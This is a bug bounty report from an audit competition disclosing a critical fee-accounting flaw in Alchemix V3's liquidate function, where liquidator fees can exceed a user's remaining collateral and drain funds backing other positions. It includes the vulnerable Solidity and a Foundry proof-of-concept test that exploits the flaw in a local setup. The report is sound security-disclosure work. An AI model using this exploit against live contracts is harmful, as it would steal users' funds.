# 58138 sc critical liquidator fees could surpass the user remaining collateral resulting in protocol insolvency

**Submitted on Oct 30th 2025 at 22:00:22 UTC by @a16 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58138
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Permanent freezing of funds
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When calling liquidate(), fees paid to the liquidator could surpass the user's remaining collateral, causing the protocol to pay the excess myt "out of pocket", which could cause protocol insolvency.

## Vulnerability Details

The underlying issue is these two lines:

```
        feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
        TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
```

In the first line, the protocol calls \_resolveRepaymentFee() which returns *feeInYield* that is proportional to repaidAmountInYield and is not capped by *account.collateralBalance*.

```
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
    Account storage account = _accounts[accountId];
    // calculate repayment fee and deduct from account
    fee = repaidAmountInYield * repaymentFee / BPS;
    account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
    return fee;
}
```

This means that if the remaining user collateral was not enough to back the liquidator fee payment, the difference would be paid from the amount that was supposed to back other users' positions.

## Impact Details

If the sum of internal accounting of users' collaterals exceed the actual myt backing, then the AlchemistV3 contract would not be able to fully repay all users, causing protocol insolvency and a loss of user funds.

## Proof of Concept

The following function could be added to AlchemistV3.t.sol

function test\_Repay\_Only\_Overpays\_If\_Fee\_Exceeds\_Remaining\_Collateral() external { // Configure: isolate repay-only, 10% repayment fee address trueAdmin = alchemist.admin(); vm.startPrank(trueAdmin); alchemist.setDepositCap(type(uint256).max); alchemist.setProtocolFee(0); alchemist.setLiquidatorFee(0); alchemist.setRepaymentFee(10\_00); // 10% vm.stopPrank();

```
// Seed MYT
vm.startPrank(someWhale);
IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
vm.stopPrank();

// Keep system healthy
vm.startPrank(yetAnotherExternalUser);
SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
vm.stopPrank();

// Victim setup
uint256 victimDeposit = 100_000e18;
vm.startPrank(address(0xbeef));
SafeERC20.safeApprove(address(vault), address(alchemist), victimDeposit);
alchemist.deposit(victimDeposit, address(0xbeef), 0);
uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
uint256 mintAmt = (alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR) / minimumCollateralization;
alchemist.mint(tokenId, mintAmt, address(0xbeef));
vm.stopPrank();

// Redemption sized to fully clear debt on maturity (forces repay-only early return)
( , uint256 debt0, ) = alchemist.getCDP(tokenId);
vm.startPrank(anotherExternalUser);
SafeERC20.safeApprove(address(alToken), address(transmuterLogic), debt0);
transmuterLogic.createRedemption(debt0);
vm.stopPrank();

// Mature the earmark
vm.roll(block.number + 5_256_000);

// Small price nudge so we enter liquidate flow under the bound, but repay-only heals it
uint256 s0 = IERC20(address(mockStrategyYieldToken)).totalSupply();
IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(s0);
uint256 s1 = (s0 * 11_000) / 10_000; // +10%
IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(s1);

// Snapshots
(uint256 colBefore, uint256 debtBefore, ) = alchemist.getCDP(tokenId);
uint256 alchMYT_before   = IERC20(address(vault)).balanceOf(address(alchemist));
uint256 liqMYT_before    = IERC20(address(vault)).balanceOf(externalUser);
uint256 transmMYT_before = IERC20(address(vault)).balanceOf(address(transmuterLogic));

// Call liquidate -> repay-only early return
vm.startPrank(externalUser);
(uint256 repaidInYield, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId);
vm.stopPrank();

// Post
uint256 alchMYT_after   = IERC20(address(vault)).balanceOf(address(alchemist));
uint256 liqMYT_after    = IERC20(address(vault)).balanceOf(externalUser);
uint256 transmMYT_after = IERC20(address(vault)).balanceOf(address(transmuterLogic));
(uint256 colAfter, uint256 debtAfter, ) = alchemist.getCDP(tokenId);

// Sanity: repay-only branch
vm.assertEq(feeInUnderlying, 0);
vm.assertEq(debtAfter, 0);
vm.assertGt(repaidInYield, 0);

// Core quantities
uint256 remainingAfterPrincipal = colBefore > repaidInYield ? (colBefore - repaidInYield) : 0;
uint256 liqFeeReceived = liqMYT_after - liqMYT_before;
uint256 alchOutflow    = alchMYT_before - alchMYT_after;
uint256 transmuterIn   = transmMYT_after - transmMYT_before;
uint256 userCollDrop   = colBefore > colAfter ? (colBefore - colAfter) : (colAfter - colBefore);

console.log("collateralBefore:", colBefore);
console.log("repaidInYield:", repaidInYield);
console.log("feeInYield (returned):", feeInYield);
console.log("remainingAfterPrincipal:", remainingAfterPrincipal);
console.log("collateralAfter:", colAfter);
console.log("liqFeeReceived:", liqFeeReceived);
console.log("alchOutflow:", alchOutflow);
console.log("transmuterIn:", transmuterIn);
console.log("userCollDrop:", userCollDrop);


vm.assertGt(feeInYield, 0, "expect non-zero repay-only fee returned");
vm.assertGt(feeInYield, remainingAfterPrincipal, "fee must exceed remaining collateral after principal");

// Verify that the caller actually received the returned fee
vm.assertEq(liqFeeReceived, feeInYield, "caller did not receive the returned fee amount");

vm.assertEq(alchOutflow, transmuterIn + feeInYield, "alchemist outflow should equal principal + fee");

// User can only fund principal + remainingAfterPrincipal from their collateral
vm.assertEq(userCollDrop, repaidInYield + remainingAfterPrincipal, "user collateral drop must stop at remainingAfterPrincipal");

// Difference between the amount that was paid as fee and the remaining collateral
uint256 subsidy = feeInYield - remainingAfterPrincipal;
console.log("SUBSIDY_CLAIMED:", subsidy);

// Assert the subsidy exists and is positive
vm.assertGt(subsidy, 0, "no subsidy observed; if this fails, fee is being clamped or skipped");
```

}
